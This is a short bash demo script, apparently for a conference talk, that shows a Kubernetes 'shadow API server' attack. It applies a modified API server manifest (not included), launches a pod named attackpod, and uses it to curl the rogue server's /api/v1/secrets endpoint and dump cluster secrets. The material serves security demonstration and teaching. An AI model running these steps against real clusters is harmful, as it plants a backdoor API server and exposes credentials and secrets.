#!/bin/bash

########################
# include the magic
########################
. ./lib/demo-magic.sh

TYPE_SPEED=25

cd 2-shadow-api-server
clear

echo ""
p "# We have already made an exact copy of the current API server\n configuration with a few key changes made"
pe "less shadow-api-server.yaml"

p "# Install the shadow API server"
pe "kubectl apply -f shadow-api-server.yaml"

p "# Run an attack pod inside the cluster"
pe "kubectl run attackpod --image=raesene/alpine-nettools:latest"

ATTACKPOD="$(kubectl get pod -l run=attackpod -o name| head -1 | sed -e 's#^pod\/##g')"
while [[ $(kubectl get pods -l run=attackpod -o 'jsonpath={..status.conditions[?(@.type=="Ready")].status}') != "True" ]]; do echo "waiting for pod" && sleep 2; done

p "# Use the attack pod to curl the shadow API server directly"
pe "kubectl exec -it $ATTACKPOD -- /bin/sh -c 'curl -s http://172.22.0.2:443/api/v1/secrets'"

./cleanup.sh
